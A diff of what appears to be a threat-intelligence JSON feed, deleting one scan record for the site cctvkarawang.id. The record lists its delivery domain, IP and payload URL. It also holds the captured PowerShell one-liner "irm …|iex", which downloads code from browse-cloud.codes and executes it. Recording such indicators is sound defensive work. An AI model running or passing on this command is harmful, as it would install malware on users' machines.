@@ -1486,27 +1486,5 @@
     ],
     "ReportId": "cmwe6egab07r40omlaykrxwjj",
     "ScannedAt": "2026-11-12T23:25:23.097000+00:00"
-  },
-  {
-    "UrlDomain": "cctvkarawang.id",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/133f5f853512bcb5",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/133f5f853512bcb5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/133f5f853512bcb5"
-    ],
-    "ReportId": "cmwe44dci07q70oml07jgqg17",
-    "ScannedAt": "2026-11-12T22:21:33.518000+00:00"
   }
 ]
